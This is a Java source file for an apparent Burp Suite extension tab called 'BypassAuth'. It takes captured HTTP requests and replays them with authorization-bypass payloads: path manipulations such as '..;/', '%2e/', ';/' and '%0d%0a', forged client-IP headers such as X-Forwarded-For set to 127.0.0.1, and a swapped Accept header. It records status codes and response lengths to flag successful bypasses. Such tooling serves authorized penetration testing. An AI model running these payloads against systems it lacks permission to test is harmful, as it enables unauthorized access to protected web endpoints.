package burp.ui;

import burp.*;
import burp.bean.AuthBean;
import burp.utils.I18nUtils;
import burp.utils.UrlCacheUtil;
import burp.utils.Utils;

import javax.swing.*;
import java.awt.*;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.Objects;
import java.util.concurrent.locks.Lock;
import java.util.concurrent.locks.ReentrantLock;

public class AuthUI extends AbstractScanUI {
    private JButton btnClear;
    private JTextField ipInputField;
    private JButton saveBtn;
    private JTabbedPane requestTabPane;
    private JTabbedPane responseTabPane;

    private static final List<AuthEntry> authlog = new ArrayList<>();
    private static String LOCAL_IP = "127.0.0.1";
    private static final Lock lock = new ReentrantLock();

    static void setCurrentlyDisplayedItem(IHttpRequestResponse item) {
        currentlyDisplayedItem = item;
    }

    static List<AuthEntry> getAuthlog() {
        return authlog;
    }

    @Override
    protected void setupScanUI() {
        resultTable = new AuthTable(new AuthModel(), requestEditor, responseEditor);
    }

    @Override
    protected void setupCommonUI() {
        panel = new JPanel(new BorderLayout());

        JPanel topPanel = new JPanel(new FlowLayout(FlowLayout.LEFT));
        btnClear = new JButton(I18nUtils.get("auth.button.clear"));
        topPanel.add(btnClear);

        topPanel.add(new JLabel(I18nUtils.get("auth.label.ip")));
        ipInputField = new JTextField("127.0.0.1");
        topPanel.add(ipInputField);

        saveBtn = new JButton(I18nUtils.get("auth.button.save"));
        topPanel.add(saveBtn);

        panel.add(topPanel, BorderLayout.NORTH);

        JSplitPane mainSplitPane = new JSplitPane(JSplitPane.VERTICAL_SPLIT);
        mainSplitPane.setResizeWeight(0.7);
        mainSplitPane.setDividerLocation(0.7);

        JScrollPane scrollPane = new JScrollPane(getResultTable());
        getResultTable().setAutoCreateRowSorter(true);
        mainSplitPane.setTopComponent(scrollPane);

        JSplitPane splitPaneDown = new JSplitPane(JSplitPane.HORIZONTAL_SPLIT);
        splitPaneDown.setResizeWeight(0.5);
        splitPaneDown.setDividerLocation(0.5);

        requestTabPane = new JTabbedPane();
        if (requestEditor != null) {
            requestTabPane.addTab("Request", requestEditor.getComponent());
        } else {
            requestTabPane.addTab("Request", new JScrollPane(new JTextArea()));
        }

        responseTabPane = new JTabbedPane();
        if (responseEditor != null) {
            responseTabPane.addTab("Response", responseEditor.getComponent());
        } else {
            responseTabPane.addTab("Response", new JScrollPane(new JTextArea()));
        }
        splitPaneDown.setLeftComponent(requestTabPane);
        splitPaneDown.setRightComponent(responseTabPane);

        mainSplitPane.setBottomComponent(splitPaneDown);
        panel.add(mainSplitPane, BorderLayout.CENTER);
    }

    @Override
    protected void loadSavedData() {
        btnClear.addActionListener(e -> {
            authlog.clear();
            if (requestEditor != null) requestEditor.setMessage(new byte[0], true);
            if (responseEditor != null) responseEditor.setMessage(new byte[0], false);
            urlHashList.clear();
            UrlCacheUtil.resetCache("auth");
            getResultTable().updateUI();
        });

        saveBtn.addActionListener(e -> {
            if (!ipInputField.getText().equals(LOCAL_IP)) {
                LOCAL_IP = ipInputField.getText();
            } else {
                LOCAL_IP = "127.0.0.1";
            }
        });
    }

    @Override
    public String getTabName() {
        return "BypassAuth";
    }

    @Override
    protected String getScanName() {
        return "Auth";
    }

    @Override
    protected void doPassiveScan(IHttpRequestResponse[] requestResponses, boolean isManual) {
        // AuthUI doesn't support passive scanning
    }

    // auth核心检测方法
    public static void Check(IHttpRequestResponse[] requestResponses) {
        lock.lock();
        try {
            IHttpRequestResponse baseRequestResponse = requestResponses[0];
            IRequestInfo analyzeRequest = Utils.helpers.analyzeRequest(baseRequestResponse);
            String method = analyzeRequest.getMethod();
            String path = analyzeRequest.getUrl().getPath();
            String request = Utils.helpers.bytesToString(baseRequestResponse.getRequest());
            URL rdurlURL = analyzeRequest.getUrl();
            String url = analyzeRequest.getUrl().toString();
            byte[] byte_Request = baseRequestResponse.getRequest();
            int len = byte_Request.length;
            byte[] body = Arrays.copyOfRange(byte_Request, analyzeRequest.getBodyOffset(), len);

            if (Utils.isUrlBlackListSuffix(url)) {
                return;
            }

            List<String> headers = Utils.helpers.analyzeRequest(baseRequestResponse).getHeaders();
            String urlWithoutQuery = "";
            try {
                URL url1 = new URL(url);
                String protocol = url1.getProtocol();
                String host = url1.getHost();
                int port = url1.getPort();
                urlWithoutQuery = protocol + "://" + host + ":" + port;
            } catch (MalformedURLException e) {
                throw new RuntimeException(e);
            }

            List<AuthBean> authRequests = new ArrayList<>();
            authRequests.addAll(prefix(method, path));
            authRequests.addAll(suffix(method, path));

            if (Objects.equals(method, "GET") || Objects.equals(method, "POST")) {
                for (AuthBean value : authRequests) {
                    if (Objects.equals(value.getMethod(), "GET")) {
                        String new_request = request.replaceFirst(path, value.getPath());
                        IHttpRequestResponse response = Utils.callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), Utils.helpers.stringToBytes(new_request));
                        String requrl = urlWithoutQuery + value.getPath();
                        String statusCode = String.valueOf(Utils.helpers.analyzeResponse(response.getResponse()).getStatusCode());
                        String length = String.valueOf(response.getResponse().length);
                        add(method, requrl, statusCode, length, response);
                    } else if (Objects.equals(value.getMethod(), "POST")) {
                        String new_request = request.replaceFirst(path, value.getPath());
                        IHttpRequestResponse response = Utils.callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), Utils.helpers.stringToBytes(new_request));
                        String requrl = urlWithoutQuery + value.getPath();
                        String statusCode = String.valueOf(Utils.helpers.analyzeResponse(response.getResponse()).getStatusCode());
                        String length = String.valueOf(response.getResponse().length);
                        add(method, requrl, statusCode, length, response);
                    }
                }
                List<AuthBean> testHeaders = forgeHeaders(method, url);
                for (AuthBean header : testHeaders) {
                    headers.add(header.getHeaders());
                }
                byte[] message = Utils.helpers.buildHttpMessage(headers, body);
                IHttpRequestResponse response = Utils.callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), message);
                String statusCode = String.valueOf(Utils.helpers.analyzeResponse(response.getResponse()).getStatusCode());
                String length = String.valueOf(response.getResponse().length);
                add(method, url, statusCode, length, response);
                for (AuthBean header : testHeaders) {
                    headers.remove(header.getHeaders());
                }
                changeAccept(headers, body, method, url, baseRequestResponse);
            }
        } finally {
            lock.unlock();
        }
    }

    private static void add(String method, String url, String statuscode, String length, IHttpRequestResponse baseRequestResponse) {
        synchronized (authlog) {
            int id = authlog.size();
            authlog.add(new AuthEntry(id, method, url, statuscode, length, baseRequestResponse));
            SwingUtilities.invokeLater(() -> getResultTable().updateUI());
        }
    }

    public static List<AuthBean> suffix(String method, String path) {
        if (path.startsWith("//")) {
            path = "/" + path.substring(2).replaceAll("/+", "/");
        }
        List<AuthBean> authRequests = new ArrayList<>();
        if (path.endsWith("/")) {
            path = path.substring(0, path.length() - 1);
            List<String> payloads = Arrays.asList(path + "%2e/", path + "/.", "./" + path + "/./", path + "%20/",
                    "/%20" + path + "%20/", path + "..;/", path + "?", path + "??", "/" + path + "//",
                    path + "/", path + "/.randomstring");
            for (String payload : payloads) {
                if ("GET".equals(method)) {
                    authRequests.add(new AuthBean("GET", payload, ""));
                } else if ("POST".equals(method)) {
                    authRequests.add(new AuthBean("POST", payload, ""));
                }
            }
        } else {
            List<String> payloads = Arrays.asList(path + "/%2e", path + "/%20", path + "%0d%0a", path + ".json", path + "/.randomstring");
            for (String payload : payloads) {
                if ("GET".equals(method)) {
                    authRequests.add(new AuthBean("GET", payload, ""));
                } else if ("POST".equals(method)) {
                    authRequests.add(new AuthBean("POST", payload, ""));
                }
            }
        }
        return authRequests;
    }

    public static List<AuthBean> prefix(String method, String path) {
        if (path.startsWith("//")) {
            path = "/" + path.substring(2).replaceAll("/+", "/");
        }
        List<AuthBean> authRequests = new ArrayList<>();
        String[] prefix = {";/", ".;/", "images/..;/", ";a/", "%23/../", "..;/..;/"};
        for (String s : prefix) {
            String[] pathParts = path.split("/");
            for (int i = 1; i < pathParts.length; i++) {
                String[] subPathParts = Arrays.copyOfRange(pathParts, i, pathParts.length);
                String[] prePathParts = Arrays.copyOfRange(pathParts, 1, i);
                String basePath = prePathParts.length > 0
                        ? "/" + String.join("/", prePathParts) + "/" + s + String.join("/", subPathParts)
                        : "/" + s + String.join("/", subPathParts);
                if ("GET".equals(method)) {
                    authRequests.add(new AuthBean("GET", basePath, ""));
                } else if ("POST".equals(method)) {
                    authRequests.add(new AuthBean("POST", basePath, ""));
                }
            }
        }
        return authRequests;
    }

    public static List<AuthBean> forgeHeaders(String method, String url) {
        List<AuthBean> authRequests = new ArrayList<>();
        List<String> payloads = Arrays.asList(
                "X-Forwarded-For: %s",
                "X-Originating-IP: %s",
                "X-Remote-IP: %s",
                "X-Remote-Addr: %s"
        );
        payloads.replaceAll(s -> String.format(s, LOCAL_IP));

        for (String payload : payloads) {
            if ("GET".equals(method)) {
                authRequests.add(new AuthBean("GET", "", payload));
            } else if ("POST".equals(method)) {
                authRequests.add(new AuthBean("POST", "", payload));
            }
        }
        return authRequests;
    }

    public static void changeAccept(List<String> headers, byte[] body, String method, String url, IHttpRequestResponse baseRequestResponse) {
        headers.removeIf(header -> header.startsWith("Accept:"));
        headers.add("Accept: application/json, text/javascript, /; q=0.01");
        byte[] message = Utils.helpers.buildHttpMessage(headers, body);
        IHttpRequestResponse response = Utils.callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), message);
        String statusCode = String.valueOf(Utils.helpers.analyzeResponse(response.getResponse()).getStatusCode());
        String length = String.valueOf(response.getResponse().length);
        add(method, url, statusCode, length, response);
    }
}

